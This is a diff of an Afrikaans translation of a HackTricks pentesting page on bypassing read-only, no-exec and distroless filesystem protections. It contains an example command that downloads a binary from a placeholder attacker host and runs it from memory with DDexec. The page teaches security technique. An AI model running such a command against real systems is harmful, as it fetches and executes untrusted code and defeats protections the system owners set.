@@ -1,4 +1,4 @@
-# Bypass FS beskerming: lees-slegs / geen-uitvoer / Distroless
+# Bypass FS protections: read-only / no-exec / Distroless
 
 <details>
 
@@ -14,7 +14,7 @@ Ander maniere om HackTricks te ondersteun:
 
 </details>
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="https://github.com/carlospolop/hacktricks/blob/af/.gitbook/assets/image%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1).png" alt=""><figcaption></figcaption></figure>
 
 As jy belangstel in 'n **hacking-loopbaan** en die onhackbare wil hack - **ons is aan die aanstel!** (_vloeiende Pools geskrewe en gesproke vereis_).
 
@@ -81,10 +81,12 @@ Daarom kan jy deur die **samestellingskode te beheer** wat deur die proses uitge
 {% hint style="success" %}
 **DDexec / EverythingExec** sal jou in staat stel om jou eie **shellcode** of **enige binêre** vanaf **geheue** te laai en **uit te voer**.
 {% endhint %}
+
 ```bash
 # Basic example
 wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
 ```
+
 Vir meer inligting oor hierdie tegniek, kyk op die Github of:
 
 {% content-ref url="ddexec.md" %}
